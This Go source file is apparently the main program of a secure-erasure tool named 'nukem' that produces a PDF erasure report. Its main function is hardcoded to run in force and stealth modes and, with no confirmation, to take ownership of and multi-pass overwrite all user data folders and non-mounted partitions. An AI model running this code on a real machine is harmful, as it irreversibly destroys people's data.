package main

import (
	"crypto/rand"
	"fmt"
	"log"
	d "nukem/detection"
	"nukem/report"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"

	"github.com/google/uuid"
)

// QuickWipe: Single pass with zeros
func quickWipe(file *os.File, size int64) error {
	buf := make([]byte, 4096)
	for i := range buf {
		buf[i] = 0
	}
	return overwriteWithBuffer(file, size, buf)
}

// DeepWipe: Multi-pass (random + known patterns)
func deepWipe(file *os.File, size int64, passes int) error {
	for i := range passes {
		buf := make([]byte, 4096)
		if i%2 == 0 {
			// Fill with random
			_, err := rand.Read(buf)
			if err != nil {
				return err
			}
		} else {
			// Pattern wipe (0xFF bytes)
			for j := range buf {
				buf[j] = 0xFF
			}
		}
		if err := overwriteWithBuffer(file, size, buf); err != nil {
			return err
		}
	}
	return nil
}

// SecureWipe: Gutmann Method (35-pass specific patterns)
func secureWipe(file *os.File, size int64) error {
	patterns := [][]byte{
		{0x55}, {0xAA},
		{0x92, 0x49, 0x24}, {0x49, 0x24, 0x92}, {0x24, 0x92, 0x49},
		{0x00}, {0x11}, {0x22}, {0x33}, {0x44}, {0x55}, {0x66}, {0x77},
		{0x88}, {0x99}, {0xAA}, {0xBB}, {0xCC}, {0xDD}, {0xEE}, {0xFF},
	}

	for i := range 35 {
		buf := make([]byte, 4096)
		if i < len(patterns) {
			// Repeat pattern fill
			p := patterns[i]
			for j := range len(buf) {
				buf[j] = p[j%len(p)]
			}
		} else {
			// Use random for remaining passes
			_, err := rand.Read(buf)
			if err != nil {
				return err
			}
		}
		if err := overwriteWithBuffer(file, size, buf); err != nil {
			return err
		}
	}
	return nil
}

func multiLayeredWipe(file *os.File, size int64, passes int) error {
	err := deepWipe(file, size, passes)
	if err != nil {
		return err
	}
	err = secureWipe(file, size)
	if err != nil {
		return err
	}
	return nil
}

// overwriteWithBuffer writes buffer repeatedly until size is covered
func overwriteWithBuffer(file *os.File, size int64, buf []byte) error {
	var totalWritten int64
	for totalWritten < size {
		toWrite := int64(len(buf))
		if remaining := size - totalWritten; remaining < toWrite {
			toWrite = remaining
		}
		wn, err := file.WriteAt(buf[:toWrite], totalWritten)
		if err != nil {
			return err
		}
		totalWritten += int64(wn)
	}
	return file.Sync()
}

// overwriteFile chooses wiping method
func overwriteFile(path string, method string, passes int) error {
	file, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		return fmt.Errorf("failed to open file %s: %v", path, err)
	}
	defer file.Close()
	info, err := file.Stat()
	if err != nil {
		return fmt.Errorf("cannot stat file %s: %v", path, err)
	}
	size := info.Size()

	switch method {
	case "quick":
		return quickWipe(file, size)
	case "deep":
		return deepWipe(file, size, passes)
	case "secure":
		return secureWipe(file, size)
	case "multilayered":
		return multiLayeredWipe(file, size, passes)
	default:
		return fmt.Errorf("unknown wipe method: %s", method)
	}
}

func takeOwnership(path string) error {
	fi, err := os.Stat(path)
	if err != nil {
		return err
	}
	var cmd *exec.Cmd
	if fi.IsDir() {
		cmd = exec.Command("takeown", "/F", path, "/R", "/D", "Y")
	} else {
		cmd = exec.Command("takeown", "/F", path)
	}
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("takeown failed: %v, output: %s", err, string(output))
	}
	return nil
}

func makeWritable(path string) error {
	fi, err := os.Stat(path)
	if err != nil {
		return err
	}
	mode := fi.Mode() | 0200
	return os.Chmod(path, mode)
}

// grantFullControl grants full control permissions recursively
func grantFullControl(path string) error {
	cmd := exec.Command("icacls", path, "/grant", "Administrators:F", "/T", "/C")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("icacls failed: %v, output: %s", err, string(out))
	}
	return nil
}

// secureDeleteDirConcurrent wipes all files concurrently with the chosen method
func secureDeleteDirConcurrent(dir string, method string, passes int, force bool, silent bool, rep *report.EraseReport, workerCount int) error {
	files := make(chan string, workerCount)
	var wg sync.WaitGroup

	worker := func() {
		defer wg.Done()
		for path := range files {
			info, err := os.Stat(path)
			if err != nil {
				rep.AddLog(report.FileEraseLog{Path: path, Status: "FAILED", Passes: passes, Error: err.Error()})
				continue
			}
			if info.IsDir() {
				continue
			}
			status := "WIPED"
			errText := ""

			if force {
				if !silent {
					if err := makeWritable(path); err != nil {
						fmt.Printf("Warning: could not make writable %s: %v\n", path, err)
					}
					if err := takeOwnership(path); err != nil {
						fmt.Printf("Warning: take ownership failed on %s: %v\n", path, err)
					}
					if err := grantFullControl(path); err != nil {
						fmt.Printf("Warning: grant full control failed on %s: %v\n", path, err)
					}
				}
			}

			if !silent {
				fmt.Printf("Overwriting file: %s\n", path)
			}

			if err := overwriteFile(path, method, passes); err != nil {
				status = "FAILED"
				errText = err.Error()
			} else {
				if err := os.Remove(path); err != nil {
					status = "FAILED"
					errText = err.Error()
				}
			}

			rep.AddLog(report.FileEraseLog{
				Path:   path,
				Status: status,
				Passes: passes,
				Error:  errText,
			})
		}
	}

	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go worker()
	}

	err := filepath.Walk(dir, func(path string, info os.FileInfo, walkErr error) error {
		if walkErr != nil {
			rep.AddLog(report.FileEraseLog{Path: path, Status: "FAILED", Passes: passes, Error: walkErr.Error()})
			return nil
		}
		if !info.IsDir() {
			files <- path
		}
		return nil
	})

	close(files)
	wg.Wait()

	if err != nil {
		return fmt.Errorf("error walking directory: %v", err)
	}

	err = os.RemoveAll(dir)
	if err != nil {
		return fmt.Errorf("failed to remove directory %s: %v", dir, err)
	}

	if !silent {
		fmt.Printf("Successfully securely wiped directory: %s\n", dir)
	}
	return nil
}

func main() {

	passes := 3      // Number of passes for deep wipe
	force := true    // Force ownership + chmod
	stealth := true  // Silent mode
	method := "deep" // "quick", "deep", or "secure", "multilayered"

	if method == "quick" || method == "secure" {
		passes = 1
	}

	partitions := d.GetNonMountedPartitions()
	users, err := d.GetAllUserDataFolders()
	if err == nil {
		for _, user := range users {
			for _, folder := range user.All() {
				partitions = append(partitions, folder)
			}
		}
	}

	rep := report.NewEraseReport(strings.Join(partitions, ","), passes, force, stealth, method)
	//rep := report.NewEraseReport(dir, passes, force, stealth, method)

	for i := range partitions {
		fi, err := os.Stat(partitions[i])
		if err != nil || !fi.IsDir() {
			log.Fatal("Invalid directory: ", partitions[i])
		}
		if err := secureDeleteDirConcurrent(partitions[i], method, passes, force, stealth, rep, 20); err != nil {
			log.Printf("Error during wipe: %v\n", err)
		}
	}

	/*
		fi, err := os.Stat(dir)
		if err != nil || !fi.IsDir() {
			log.Fatal("Invalid directory: ", dir)
		}
		if err := secureDeleteDirConcurrent(dir, method, passes, force, stealth, rep, 20); err != nil {
			log.Printf("Error during wipe: %v\n", err)
		}
	*/
	rep.Complete()
	uid := uuid.New().String()
	pdfName := fmt.Sprintf("reports/erasure_report_%s.pdf", uid)
	if err := rep.WritePDF(pdfName); err != nil {
		log.Fatalf("Failed to create PDF: %v", err)
	}
	log.Println("Erase report generated.")
	log.Println(pdfName)
}
